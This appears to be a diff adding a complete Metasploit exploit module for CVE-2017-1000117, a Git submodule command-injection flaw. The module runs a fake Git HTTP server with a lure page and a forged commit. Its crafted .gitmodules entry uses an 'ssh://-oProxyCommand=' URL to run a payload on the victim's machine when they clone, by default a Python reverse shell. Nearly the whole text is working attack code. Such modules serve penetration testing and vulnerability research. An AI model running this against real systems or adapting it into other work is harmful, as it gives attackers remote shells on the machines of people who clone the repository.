@@ -1,0 +1,200 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Malicious Git HTTP Server For CVE-2017-1000117',
+        'Description' => %q(
+                  This module exploits CVE-2017-1000117, which affects Git
+          version 2.7.5 and lower. A submodule of the form 'ssh://' can be passed
+          parameters from the username incorrectly. This can be used to inject
+          commands to the operating system when the submodule is cloned.
+
+          This module creates a fake git repository which contains a submodule
+          containing the vulnerability. The vulnerability is triggered when the
+          submodules are initialised.
+        ),
+        'License' => MSF_LICENSE,
+        'References'     =>
+          [
+            ['CVE', '2017-1000117'],
+            ['URL', 'http://seclists.org/oss-sec/2017/q3/280' ]
+          ],
+        'DisclosureDate' => 'Aug 10 2017',
+        'Targets' =>
+          [
+            [
+              'Automatic',
+              {
+                'Platform' => [ 'unix' ],
+                'Arch' => ARCH_CMD,
+                'Payload' =>
+                  {
+                    'Compat' =>
+                      {
+                        'PayloadType' => 'python'
+                      }
+                  }
+              }
+            ]
+          ],
+        'DefaultOptions' =>
+          {
+            'Payload' => 'cmd/unix/reverse_python'
+          },
+        'DefaultTarget'  => 0
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('GIT_URI', [false, 'The URI to use as the malicious Git instance (empty for random)', '']),
+        OptString.new('GIT_SUBMODULE', [false, 'The path to use as the malicious git submodule (empty for random)', ''])
+      ]
+    )
+  end
+
+  def setup
+    @repo_data = {
+      git: { files: {} }
+    }
+    setup_git
+    super
+  end
+
+  def setup_git
+    # URI must start with a /
+    unless git_uri && git_uri =~ /^\//
+      fail_with(Failure::BadConfig, 'GIT_URI must start with a /')
+    end
+
+    payload_cmd = payload.encoded + " &"
+    payload_cmd = Rex::Text.to_hex(payload_cmd, '%')
+
+    submodule_path = datastore['GIT_SUBMODULE']
+    if submodule_path.blank?
+      submodule_path = Rex::Text.rand_text_alpha(rand(8) + 2).downcase
+    end
+
+    gitmodules = "[submodule \"#{submodule_path}\"]
+path = #{submodule_path}
+url = ssh://-oProxyCommand=#{payload_cmd}/
+"
+    sha1, content = build_object('blob', gitmodules)
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+
+    tree = "100644 .gitmodules\0#{[sha1].pack('H*')}"
+    tree += "160000 #{submodule_path}\0#{[sha1].pack('H*')}"
+    sha1, content = build_object('tree', tree)
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+
+    ## build the supposed commit that dropped this file, which has a random user/company
+    email = Rex::Text.rand_mail_address
+    first, last, company = email.scan(/([^\.]+)\.([^\.]+)@(.*)$/).flatten
+    full_name = "#{first.capitalize} #{last.capitalize}"
+    tstamp = Time.now.to_i
+    author_time = rand(tstamp)
+    commit_time = rand(author_time)
+    tz_off = rand(10)
+    commit = "author #{full_name} <#{email}> #{author_time} -0#{tz_off}00\n" \
+             "committer #{full_name} <#{email}> #{commit_time} -0#{tz_off}00\n" \
+             "\n" \
+             "Initial commit to open git repository for #{company}!\n"
+
+    sha1, content = build_object('commit', "tree #{sha1}\n#{commit}")
+    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
+    @repo_data[:git][:files]['/HEAD'] = "ref: refs/heads/master\n"
+    @repo_data[:git][:files]['/info/refs'] = "#{sha1}\trefs/heads/master\n"
+  end
+
+  # Build's a Git object
+  def build_object(type, content)
+    # taken from http://schacon.github.io/gitbook/7_how_git_stores_objects.html
+    header = "#{type} #{content.size}\0"
+    store = header + content
+    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
+  end
+
+  # Returns the Git object path name that a file with the provided SHA1 will reside in
+  def get_path(sha1)
+    sha1[0...2] + '/' + sha1[2..40]
+  end
+
+  def exploit
+    super
+  end
+
+  def primer
+    # add the git and mercurial URIs as necessary
+    hardcoded_uripath(git_uri)
+    print_status("Malicious Git URI is #{URI.parse(get_uri).merge(git_uri)}")
+  end
+
+  # handles routing any request to the mock git, mercurial or simple HTML as necessary
+  def on_request_uri(cli, req)
+    # if the URI is one of our repositories and the user-agent is that of git/mercurial
+    # send back the appropriate data, otherwise just show the HTML version
+    user_agent = req.headers['User-Agent']
+    if user_agent && user_agent =~ /^git\// && req.uri.start_with?(git_uri)
+      do_git(cli, req)
+      return
+    end
+
+    do_html(cli, req)
+  end
+
+  # simulates a Git HTTP server
+  def do_git(cli, req)
+    # determine if the requested file is something we know how to serve from our
+    # fake repository and send it if so
+    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, '')
+    if @repo_data[:git][:files].key?(req_file)
+      vprint_status("Sending Git #{req_file}")
+      send_response(cli, @repo_data[:git][:files][req_file])
+    else
+      vprint_status("Git #{req_file} doesn't exist")
+      send_not_found(cli)
+    end
+  end
+
+  # simulates an HTTP server with simple HTML content that lists the fake
+  # repositories available for cloning
+  def do_html(cli, _req)
+    resp = create_response
+    resp.body = <<HTML
+     <html>
+      <head><title>Public Repositories</title></head>
+      <body>
+        <p>Here are our public repositories:</p>
+        <ul>
+HTML
+    this_git_uri = URI.parse(get_uri).merge(git_uri)
+    resp.body << "<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>"
+    resp.body << <<HTML
+        </ul>
+      </body>
+    </html>
+HTML
+
+    cli.send_response(resp)
+  end
+
+  # Returns the value of GIT_URI if not blank, otherwise returns a random .git URI
+  def git_uri
+    return @git_uri if @git_uri
+    if datastore['GIT_URI'].blank?
+      @git_uri = '/' + Rex::Text.rand_text_alpha(rand(10) + 2).downcase + '.git'
+    else
+      @git_uri = datastore['GIT_URI']
+    end
+  end
+end
